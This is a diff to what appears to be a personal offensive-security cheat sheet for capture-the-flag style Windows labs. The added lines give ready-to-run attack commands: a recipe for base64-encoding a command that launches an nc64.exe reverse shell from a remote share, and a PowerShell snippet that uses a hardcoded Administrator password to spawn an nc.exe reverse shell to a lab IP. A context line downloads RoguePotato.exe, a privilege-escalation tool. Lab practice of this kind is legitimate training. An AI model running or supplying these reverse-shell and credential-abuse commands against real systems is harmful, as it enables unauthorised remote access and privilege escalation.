@@ -26,6 +26,21 @@ smbserver or powershell download file
 invoke-webrequest -uri 'http://10.10.14.28/RoguePotato.exe' -outfile .\rp.exe
 ```
 
+powershell run b64'ed commands
+
+```
+echo 'cmd /c "\\10.10.14.6\share\nc64.exe -e cmd 10.10.14.6 443"' | iconv -f ascii -t utf-16le | base64 -w0
+powershell /enc YwBt....
+```
+
+powershell su root
+
+```
+$password = convertto-securestring -AsPlainText -Force -String "butterfly!#1";
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\Administrator",$password;
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe 10.10.14.23 5555} -credential $credential;
+```
+
 run as
 
 ```
